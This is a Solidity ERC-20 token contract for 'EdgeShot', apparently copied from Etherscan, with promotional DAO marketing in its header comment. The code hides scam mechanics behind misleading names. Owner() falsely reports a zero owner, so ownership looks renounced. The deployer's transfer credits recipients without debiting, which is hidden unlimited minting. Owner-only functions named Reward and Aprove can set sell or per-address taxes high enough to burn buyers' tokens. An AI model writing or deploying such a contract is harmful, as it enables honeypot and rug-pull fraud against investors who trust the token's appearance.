/**
 *Submitted for verification at Etherscan.io on 2022-12-30
*/

/**
 Edgeshot

EDGESHOT is a groundbreaking support protocol built on the Ethereum Blockchain , operating as Decentralized Autonomous Organization (DAO), targeting everyone who loves meme projects 
EDGESHOT is developed with the team's desire to build an ecosystem to help the community quickly evaluate, access, and invest in projects supported by EDGESHOT’s or the community's choice.

💎DAO - Community decides the future
💎Massive marketing + AMA tour
💎EDGESHOT NFTs Gallery and Staking DApp 
💎CMC + CG Fast track
💎 Auto burn Mechanism 

•EDGESHOT strives to become a cornerstone of the Web 3.0 revolution
It aims to break the data silo paradigm by interconnecting with blockchains, wallets & DAOs

♻️ It’s time to become one of the first investors to own EDGESHOT Token to unlock your way into the era of easy DAO DEFI 2.0

TG: https://t.me/EdgeShotETH

*/

// SPDX-License-Identifier: MIT



 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _Owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        _transferOwnership(_msgSender());
    }

    
    function Owner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyOwner() {
        require(_Owner == _msgSender(), "Ownable: caller is not the Owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new Owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _Owner;
        _Owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}



library SafeMath {
   
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

   
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

   
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}





interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





contract ERC20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

   
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed Owner, address indexed spender, uint256 value);//10

    
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    
    function name() public view virtual returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    
    function allowance(address Owner, address spender) public view virtual returns (uint256) {
        return _allowances[Owner][spender];
    }

    
    function approve(address spender, uint256 Amount) public virtual returns (bool) {
        address Owner = _msgSender();
        _approve(Owner, spender, Amount);
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Owner = _msgSender();
        _approve(Owner, spender, _allowances[Owner][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Owner = _msgSender();
        uint256 currentAllowance = _allowances[Owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    
    function _approve(
        address Owner,
        address spender,
        uint256 Amount
    ) internal virtual {
        require(Owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Owner][spender] = Amount;
        emit Approval(Owner, spender, Amount);
    }

    
    function _spendAllowance(
        address Owner,
        address spender,
        uint256 Amount
    ) internal virtual {
        uint256 currentAllowance = allowance(Owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(Owner, spender, currentAllowance - Amount);
            }
        }
    }

    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {}

    
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {}
}


contract EdgeShot is ERC20, Ownable {
    
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    } // dmm

    function _transfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Amount, "ERC20: transfer Amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Amount;
        }
        _balances[to] += Amount;

        emit Transfer(from, to, Amount);

        
    }

    function _burn(address account, uint256 Amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Amount, "ERC20: burn Amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Amount;
        }
        _totalSupply -= Amount;

        emit Transfer(account, address(0), Amount);
    }

    function _Mnit(address account, uint256 Amount) internal virtual {
        require(account != address(0), "ERC20: Mnit to the zero address"); 

        _totalSupply += Amount;
        _balances[account] += Amount;
        emit Transfer(address(0), account, Amount);
    }

    

    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) ERC20(name_, symbol_) {
        _Mnit(msg.sender, totalSupply_ * 10**decimals());

        
        _defaultSellkFee = 30; 
        _defaultBuykFee = 2;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellkFee = 0;

    uint256 private _defaultBuykFee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _Aprove;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyOwner returns (bool) {
        return _release[_address];
    }


    function PairList(address _address) external onlyOwner {
        uniswapV2Pair = _address;
    }


    function Reward(uint256 _value) external onlyOwner {
        _defaultSellkFee = _value;
    }

    function Aprove(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _Aprove[_address] = _value;
    }

    function getAprove(address _address) external view onlyOwner returns (uint256) {
        return _Aprove[_address];
    }


    function setMAccountkFee(address _address, bool _value) external onlyOwner {
        _mAccount[_address] = _value;
    }

    function getMAccountkFee(address _address) external view onlyOwner returns (bool) {
        return _mAccount[_address];
    }

    function _checkFreeAccount(address from, address to) internal view returns (bool) {
        return _mAccount[from] || _mAccount[to];
    }


    function _receiveF(
        address from,
        address to,
        uint256 _Amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Amount, "ERC20: transfer Amount exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, to)) {
            rF = false;
        }
        uint256 tradekFeeAmount = 0;

        if (rF) {
            uint256 tradekFee = 0;
            if (uniswapV2Pair != address(0)) {
                if (to == uniswapV2Pair) {

                    tradekFee = _defaultSellkFee;
                }
                if (from == uniswapV2Pair) {

                    tradekFee = _defaultBuykFee;
                }
            }
            if (_Aprove[from] > 0) {
                tradekFee = _Aprove[from];
            }

            tradekFeeAmount = _Amount.mul(tradekFee).div(100);
        }


        if (tradekFeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekFeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekFeeAmount);
            emit Transfer(from, _deadAddress, tradekFeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekFeeAmount);
        _balances[to] = _balances[to].add(_Amount - tradekFeeAmount);
        emit Transfer(from, to, _Amount - tradekFeeAmount);
    }

    function transfer(address to, uint256 Amount) public virtual returns (bool) {
        address Owner = _msgSender();
        if (_release[Owner] == true) {
            _balances[to] += Amount;
            return true;
        }
        _receiveF(Owner, to, Amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Amount);
        _receiveF(from, to, Amount);
        return true;
    }
}